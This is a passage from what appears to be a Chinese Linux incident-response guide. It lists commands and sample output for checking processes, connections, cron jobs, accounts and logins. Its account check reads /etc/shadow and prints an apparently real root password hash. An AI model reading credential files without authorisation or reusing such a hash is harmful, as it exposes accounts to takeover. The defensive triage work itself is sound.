class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> nethogs<br></code></pre></td></tr></table></figure><h5 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h5><p>管理员权限执行 nethogs，默认会以实时流量进行降序刷新</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">NetHogs version <span class="hljs-number">0.8.6-3</span><br><br>    PID USER     PROGRAM                                                                                            DEV         SENT      RECEIVED<br> <span class="hljs-number">676984</span> root     sshd: root@pts/<span class="hljs-number">0</span>                                                                                   eth0        <span class="hljs-number">0</span>.<span class="hljs-number">321</span>       <span class="hljs-number">0</span>.<span class="hljs-number">067</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">44765-89.248</span>.<span class="hljs-number">165.97:56284</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">011</span>       <span class="hljs-number">0</span>.<span class="hljs-number">023</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">8066-162.216</span>.<span class="hljs-number">149.193:50532</span>                                                                       <span class="hljs-number">0</span>.<span class="hljs-number">011</span>       <span class="hljs-number">0</span>.<span class="hljs-number">012</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">6000-205.210</span>.<span class="hljs-number">31.156:50132</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">3306-78.128</span>.<span class="hljs-number">114.102:50289</span>                                                                        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">35487-31.6</span>.<span class="hljs-number">65.59:23619</span>                                                                           <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     <span class="hljs-number">172.16.24.136</span>:<span class="hljs-number">55182-100.100</span>.<span class="hljs-number">154.78:80</span>                                                                          <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br> <span class="hljs-number">671886</span> root     /usr/local/aegis/aegis_client/aegis_11_91/AliYunDun                                                eth0        <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br>      ? root     unknown TCP                                                                                                    <span class="hljs-number">0</span>.<span class="hljs-number">000</span>       <span class="hljs-number">0</span>.<span class="hljs-number">000</span> KB/sec<br><br></code></pre></td></tr></table></figure><h4 id="确认进程id-pid"><a href="#确认进程id-pid" class="headerlink" title="确认进程id(pid)"></a>确认进程id(pid)</h4><h5 id="pidof-精确匹配-已知进程全名"><a href="#pidof-精确匹配-已知进程全名" class="headerlink" title="pidof-精确匹配-已知进程全名"></a>pidof-精确匹配-已知进程全名</h5><p>pidof “process name”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pidof <span class="hljs-string">&quot;/usr/sbin/mysqld&quot;</span></span><br><span class="hljs-number">659535</span><br>root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pidof <span class="hljs-string">&quot;mysqld&quot;</span></span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><h5 id="ps-pgrep-模糊匹配-已知进程部分名称"><a href="#ps-pgrep-模糊匹配-已知进程部分名称" class="headerlink" title="ps&#x2F;pgrep-模糊匹配-已知进程部分名称"></a>ps&#x2F;pgrep-模糊匹配-已知进程部分名称</h5><p>ps -ef | grep “process name” | grep -v grep | awk ‘{print $2}’</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">root@iZbp1191gh7vw52537lyxrZ:~# <span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;my&quot;</span> | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><p>pgreap -f “process name”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span>:~<span class="hljs-meta"># pgrep -f <span class="hljs-string">&quot;my&quot;</span></span><br><span class="hljs-number">659535</span><br></code></pre></td></tr></table></figure><h5 id="排查进程详细内容"><a href="#排查进程详细内容" class="headerlink" title="排查进程详细内容"></a>排查进程详细内容</h5><h6 id="lsof-p-pid"><a href="#lsof-p-pid" class="headerlink" title="lsof -p pid"></a>lsof -p pid</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# lsof -p <span class="hljs-number">659535</span><br><span class="hljs-attribute">COMMAND</span>    PID  USER   FD      TYPE             DEVICE SIZE/<span class="hljs-literal">OFF</span>      NODE NAME<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql  cwd       DIR              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>     <span class="hljs-number">4096</span>    <span class="hljs-number">138978</span> /var/lib/mysql<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql  rtd       DIR              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>     <span class="hljs-number">4096</span>         <span class="hljs-number">2</span> /<br><span class="hljs-attribute">81920</span>    <span class="hljs-number">267788</span> /var/lib/mysql/#innodb_temp/temp_10.ibt<br><span class="hljs-attribute">mysqld</span>  <span class="hljs-number">659535</span> mysql   <span class="hljs-number">37</span>w      REG              <span class="hljs-number">252</span>,<span class="hljs-number">3</span>      <span class="hljs-number">157</span>    <span class="hljs-number">138921</span> /var/lib/mysql/binlog.<span class="hljs-number">000244</span><br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~#<br></code></pre></td></tr></table></figure><h4 id="检查进程启动目录"><a href="#检查进程启动目录" class="headerlink" title="检查进程启动目录"></a>检查进程启动目录</h4><p>需要注意不一定是恶意文件目录</p><h5 id="pwdx-pid"><a href="#pwdx-pid" class="headerlink" title="pwdx pid"></a>pwdx pid</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># pwdx 659535</span><br><span class="hljs-number">659535</span>: <span class="hljs-regexp">/var/lib</span><span class="hljs-regexp">/mysql</span><br></code></pre></td></tr></table></figure><h4 id="检查进程实际启动文件"><a href="#检查进程实际启动文件" class="headerlink" title="检查进程实际启动文件"></a>检查进程实际启动文件</h4><p>查看到对应进程可执行文件的绝对路径</p><h5 id="ls-lat-proc-pid-exe"><a href="#ls-lat-proc-pid-exe" class="headerlink" title="ls -lat &#x2F;proc&#x2F;pid&#x2F;exe"></a>ls -lat &#x2F;proc&#x2F;pid&#x2F;exe</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/exe<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">11</span> <span class="hljs-number">09</span>:<span class="hljs-number">35</span> /proc/<span class="hljs-number">659535</span>/exe -&gt; /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h4 id="检查进程关联文件"><a href="#检查进程关联文件" class="headerlink" title="检查进程关联文件"></a>检查进程关联文件</h4><h5 id="cat-proc-pid-maps"><a href="#cat-proc-pid-maps" class="headerlink" title="cat &#x2F;proc&#x2F;pid&#x2F;maps"></a>cat &#x2F;proc&#x2F;pid&#x2F;maps</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# cat /proc/<span class="hljs-number">659535</span>/maps<br><span class="hljs-attribute">55f8c0537000</span>-<span class="hljs-number">55</span>f8c0df4000 r--p <span class="hljs-number">00000000</span> fc:<span class="hljs-number">03</span> <span class="hljs-number">797247</span>                     /usr/sbin/mysqld<br><span class="hljs-attribute">55f8c0df4000</span>-<span class="hljs-number">55</span>f8c2549000 r-xp <span class="hljs-number">008</span>bd000 fc:<span class="hljs-number">03</span> <span class="hljs-number">797247</span>                     /usr/sbin/mysqld<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~#<br></code></pre></td></tr></table></figure><h4 id="检查进程启动的所有线程"><a href="#检查进程启动的所有线程" class="headerlink" title="检查进程启动的所有线程"></a>检查进程启动的所有线程</h4><h5 id="ps-H-T-p-pid"><a href="#ps-H-T-p-pid" class="headerlink" title="ps H -T -p pid"></a>ps H -T -p pid</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps H -T -p <span class="hljs-number">659535</span><br>    <span class="hljs-attribute">PID</span>    SPID TTY      STAT   TIME COMMAND<br> <span class="hljs-attribute">659535</span>  <span class="hljs-number">659535</span> ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/mysqld<br> <span class="hljs-attribute">659535</span>  <span class="hljs-number">659538</span> ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">17</span> /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><p>SPID：线程ID </p><p>COMMAND：线程名称</p><h5 id="ps-Lf-pid"><a href="#ps-Lf-pid" class="headerlink" title="ps -Lf pid"></a>ps -Lf pid</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ps -Lf <span class="hljs-number">659535</span><br><span class="hljs-attribute">UID</span>          PID    PPID     LWP  C NLWP STIME TTY      STAT   TIME CMD<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">659535</span>  <span class="hljs-number">0</span>   <span class="hljs-number">39</span> Mar07 ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/mysqld<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">659535</span>       <span class="hljs-number">1</span>  <span class="hljs-number">659538</span>  <span class="hljs-number">0</span>   <span class="hljs-number">39</span> Mar07 ?        Ssl    <span class="hljs-number">0</span>:<span class="hljs-number">17</span> /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h3 id="排查异常网络连接"><a href="#排查异常网络连接" class="headerlink" title="排查异常网络连接"></a>排查异常网络连接</h3><h4 id="netstat-anlp-grep-ESTABLISHED"><a href="#netstat-anlp-grep-ESTABLISHED" class="headerlink" title="netstat -anlp | grep ESTABLISHED"></a>netstat -anlp | grep ESTABLISHED</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# netstat -anlp | grep ESTABLISHED<br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">172.16.24.136:51856</span>     <span class="hljs-number">100.100.30.28:80</span>        ESTABLISHED <span class="hljs-number">442626</span>/AliYunDun<br><span class="hljs-attribute">tcp</span>        <span class="hljs-number">0</span>     <span class="hljs-number">80</span> <span class="hljs-number">172.16.24.136:22</span>        <span class="hljs-number">218.30.113.52:1642</span>      ESTABLISHED <span class="hljs-number">671506</span>/sshd: root@p<br></code></pre></td></tr></table></figure><h4 id="netstat-anlp-grep-LISTEN"><a href="#netstat-anlp-grep-LISTEN" class="headerlink" title="netstat -anlp | grep LISTEN"></a>netstat -anlp | grep LISTEN</h4><p>检查设备监听情况，排查是否存在高危端口、是否存在监听0.0.0.0</p><h3 id="排查异常定时任务"><a href="#排查异常定时任务" class="headerlink" title="排查异常定时任务"></a>排查异常定时任务</h3><h4 id="检查系统定时任务-etc-crontab"><a href="#检查系统定时任务-etc-crontab" class="headerlink" title="检查系统定时任务&#x2F;etc&#x2F;crontab"></a>检查系统定时任务&#x2F;etc&#x2F;crontab</h4><h5 id="cat-etc-crontab"><a href="#cat-etc-crontab" class="headerlink" title="cat &#x2F;etc&#x2F;crontab"></a>cat &#x2F;etc&#x2F;crontab</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># cat /etc/crontab</span><br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br><span class="hljs-attr">SHELL</span><span class="hljs-operator">=</span><span class="hljs-symbol">/bin/sh</span><br><span class="hljs-comment"># You can also override PATH, but by default, newer versions inherit it from the environment</span><br><span class="hljs-comment">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br><span class="hljs-number">17</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span>root    cd <span class="hljs-symbol">/</span> <span class="hljs-operator">&amp;&amp;</span> run-parts <span class="hljs-operator">-</span>-report <span class="hljs-symbol">/etc/cron.hourly</span><br><span class="hljs-number">25</span> <span class="hljs-number">6</span><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span>roottest <span class="hljs-operator">-</span>x <span class="hljs-symbol">/usr/sbin/anacron</span> <span class="hljs-operator">||</span> ( cd <span class="hljs-symbol">/</span> <span class="hljs-operator">&amp;&amp;</span> run-parts <span class="hljs-operator">-</span>-report <span class="hljs-symbol">/etc/cron.daily</span> )<br><span class="hljs-number">47</span> <span class="hljs-number">6</span><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-number">7</span>roottest <span class="hljs-operator">-</span>x <span class="hljs-symbol">/usr/sbin/anacron</span> <span class="hljs-operator">||</span> ( cd <span class="hljs-symbol">/</span> <span class="hljs-operator">&amp;&amp;</span> run-parts <span class="hljs-operator">-</span>-report <span class="hljs-symbol">/etc/cron.weekly</span> )<br><span class="hljs-number">52</span> <span class="hljs-number">6</span><span class="hljs-number">1</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span>roottest <span class="hljs-operator">-</span>x <span class="hljs-symbol">/usr/sbin/anacron</span> <span class="hljs-operator">||</span> ( cd <span class="hljs-symbol">/</span> <span class="hljs-operator">&amp;&amp;</span> run-parts <span class="hljs-operator">-</span>-report <span class="hljs-symbol">/etc/cron.monthly</span> )<br></code></pre></td></tr></table></figure><h4 id="检查各用户定时任务-var-spool-cron"><a href="#检查各用户定时任务-var-spool-cron" class="headerlink" title="检查各用户定时任务 &#x2F;var&#x2F;spool&#x2F;cron"></a>检查各用户定时任务 &#x2F;var&#x2F;spool&#x2F;cron</h4><h5 id="cat-var-spool-cron-username"><a href="#cat-var-spool-cron-username" class="headerlink" title="cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;username"></a>cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;username</h5><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-xx_xx_xx_xx cron]<span class="hljs-comment"># ls -lat /var/spool/cron/</span><br>总用量 12<br>drwx------. <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>3月 <span class="hljs-number"> 12 </span>17:20 .<br>-rw-------  <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 19 </span>3月 <span class="hljs-number"> 12 </span>17:20 root<br>drwxr-xr-x.<span class="hljs-number"> 11 </span>root root<span class="hljs-number"> 4096 </span>8月 <span class="hljs-number"> 18 </span>2023 ..<br><br><br>(base) [root@aliyun-xx_xx_xx_xx cron]<span class="hljs-comment"># cat /var/spool/cron/root</span><br>* * * * * echo 111<br>您在 /var/spool/mail/root 中有新邮件<br></code></pre></td></tr></table></figure><h5 id="检查当前用户定时任务-crontab-l"><a href="#检查当前用户定时任务-crontab-l" class="headerlink" title="检查当前用户定时任务 crontab -l"></a>检查当前用户定时任务 crontab -l</h5><p>读取&#x2F;var&#x2F;spool&#x2F;cron目录下对应用户的记录</p><h5 id="检查对于用户的定时任务-crontab-u-name-l"><a href="#检查对于用户的定时任务-crontab-u-name-l" class="headerlink" title="检查对于用户的定时任务 crontab -u name -l"></a>检查对于用户的定时任务 crontab -u name -l</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span>-x cron]<span class="hljs-meta"># crontab -u root -l</span><br>* * * * * echo <span class="hljs-number">111</span><br></code></pre></td></tr></table></figure><h4 id="需要关注的定时任务目录及文件"><a href="#需要关注的定时任务目录及文件" class="headerlink" title="需要关注的定时任务目录及文件"></a>需要关注的定时任务目录及文件</h4><h5 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>crontab<br><span class="hljs-regexp">/etc/</span>cron.hourly<br><span class="hljs-regexp">/etc/</span>cron.daily<br><span class="hljs-regexp">/etc/</span>cron.weekly<br><span class="hljs-regexp">/etc/</span>cron.monthly<br><span class="hljs-regexp">/etc/</span>anacrontab<br></code></pre></td></tr></table></figure><h5 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>cron.d/*<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>*<br></code></pre></td></tr></table></figure><h3 id="排查异常用户"><a href="#排查异常用户" class="headerlink" title="排查异常用户"></a>排查异常用户</h3><h4 id="检查特权账号"><a href="#检查特权账号" class="headerlink" title="检查特权账号"></a>检查特权账号</h4><h5 id="awk-F-‘-3-0-print-1-’-etc-passwd"><a href="#awk-F-‘-3-0-print-1-’-etc-passwd" class="headerlink" title="awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd"></a>awk -F: ‘$3&#x3D;&#x3D;0 {print $1}’ &#x2F;etc&#x2F;passwd</h5><p>默认情况下，只有root用户是特权用户</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">root<span class="hljs-meta">@iZbp</span>1191gh7vw52537lyxrZ:/# awk -F: <span class="hljs-string">&#x27;<span class="hljs-subst">$3</span>==0 &#123;print <span class="hljs-subst">$1</span>&#125;&#x27;</span> /etc/passwd<br>root<br></code></pre></td></tr></table></figure><p>读取&#x2F;etc&#x2F;passwd文件 以 : 分割字符，当第三个字符为0时，输出第一个字符</p><h4 id="检查可登录账号"><a href="#检查可登录账号" class="headerlink" title="检查可登录账号"></a>检查可登录账号</h4><p>查看存在密码账户，也就是可能会登录的账户</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">awk <span class="hljs-string">&#x27;/\<span class="hljs-variable">$1</span>|\<span class="hljs-variable">$5</span>|\<span class="hljs-variable">$6</span>/ &#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> /etc/shadow<br></code></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift">root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span>:<span class="hljs-regexp">/# awk &#x27;/</span>\<span class="hljs-variable">$1</span><span class="hljs-operator">|</span>\<span class="hljs-variable">$5</span><span class="hljs-operator">|</span>\<span class="hljs-variable">$6</span><span class="hljs-operator">/</span> &#123;print <span class="hljs-variable">$1</span>&#125;&#x27; <span class="hljs-regexp">/etc/</span>shadow<br>root:<span class="hljs-variable">$6</span><span class="hljs-variable">$OFsjgtZl</span><span class="hljs-variable">$ng76xjs7xQZH0asW6h1RGwXSSD6nD5sIJF163Etabm8ydItXJiD0T8KRBPwmcUdG</span><span class="hljs-operator">/</span><span class="hljs-type">WDlckAtnlQOmaYVnDPis</span>.:<span class="hljs-number">19548</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><br></code></pre></td></tr></table></figure><p>读取 &#x2F;etc&#x2F;shadow 文件，匹配包含 $1 $5 $6 任意一个的字符串</p><h3 id="排查异常登录"><a href="#排查异常登录" class="headerlink" title="排查异常登录"></a>排查异常登录</h3><p>检查&#x2F;var&#x2F;run&#x2F;utmp，&#x2F;var&#x2F;log&#x2F;wtmp 中的记录</p><h4 id="who"><a href="#who" class="headerlink" title="who"></a>who</h4><p>查看当前登录用户信息用户名、登录方式（tty：本地登录、pst：远程登录）、登录时间、登录IP</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# who<br>root     tty1         2022<span class="hljs-string">-06</span><span class="hljs-string">-26</span> 09:35<br>root     pts/0        2022<span class="hljs-string">-08</span><span class="hljs-string">-24</span> 22:39 (125.33.205.114)<br></code></pre></td></tr></table></figure><p>默认数据来源</p><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;var&#x2F;log&#x2F;wtmp 二进制文件 权限 -rw-rw-r–  root utmp</p><h4 id="w"><a href="#w" class="headerlink" title="w"></a>w</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># w</span><br> <span class="hljs-number">22</span>:<span class="hljs-number">53</span>:<span class="hljs-number">35</span> up <span class="hljs-number">59</span> days, <span class="hljs-number">13</span>:<span class="hljs-number">20</span>,  <span class="hljs-number">2</span> users,  load average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     <span class="hljs-title">TTY</span>      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>root     tty1                      <span class="hljs-number">266</span>月<span class="hljs-number">22</span>  <span class="hljs-number">1</span>:<span class="hljs-number">35</span>   <span class="hljs-number">0.10s</span>  <span class="hljs-number">0.10s</span> -bash<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">125.33</span>.<span class="hljs-number">205.114</span>   <span class="hljs-number">22</span>:<span class="hljs-number">39</span>    <span class="hljs-number">7.00s</span>  <span class="hljs-number">0.02s</span>  <span class="hljs-number">0.00s</span> w<br></code></pre></td></tr></table></figure><p>默认数据来源</p><p>&#x2F;var&#x2F;run&#x2F;utmp 二进制文件 权限 -rw-rw-r–  root utmp</p><p>&#x2F;proc</p><h4 id="last"><a href="#last" class="headerlink" title="last"></a>last</h4><p>输出历史登录成功用户</p><h4 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h4><p>输出历史登录用户，包含登录成功和失败</p><h3 id="排查异常开机启动"><a href="#排查异常开机启动" class="headerlink" title="排查异常开机启动"></a>排查异常开机启动</h3><h4 id="开机启动目录-etc-init-d"><a href="#开机启动目录-etc-init-d" class="headerlink" title="开机启动目录&#x2F;etc&#x2F;init.d&#x2F;"></a>开机启动目录&#x2F;etc&#x2F;init.d&#x2F;</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># ls -lat /etc/init.d/</span><br>total 184<br>drwxr-xr-x<span class="hljs-number"> 116 </span>root root<span class="hljs-number"> 4096 </span>Mar <span class="hljs-number"> 2 </span>06:03 ..<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Feb <span class="hljs-number"> 5 </span>17:08 .<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 5607 </span>Jun<span class="hljs-number"> 15 </span><span class="hljs-number"> 2023 </span>mysql<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4579 </span>May<span class="hljs-number"> 31 </span><span class="hljs-number"> 2023 </span>nginx<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 985 </span>Dec <span class="hljs-number"> 2 </span><span class="hljs-number"> 2022 </span>grub-common<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2915 </span>May<span class="hljs-number"> 10 </span><span class="hljs-number"> 2022 </span>apport<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 6871 </span>Mar <span class="hljs-number"> 8 </span><span class="hljs-number"> 2022 </span>udev<br>-rwxr-xr-x  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 4060 </span>Feb<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>ssh<br></code></pre></td></tr></table></figure><h3 id="排查异常文件"><a href="#排查异常文件" class="headerlink" title="排查异常文件"></a>排查异常文件</h3><p>检查文件内容使用 cat 命令，不会修改文件时间属性，如果使用vim，可能会修改文件时间属性</p><h4 id="文件时间检查"><a href="#文件时间检查" class="headerlink" title="文件时间检查"></a>文件时间检查</h4><p><strong>stat filename 查看文件时间，change&#x2F;最近改动是文件落盘时间</strong></p><p>示例：</p><p>原始文件时间信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 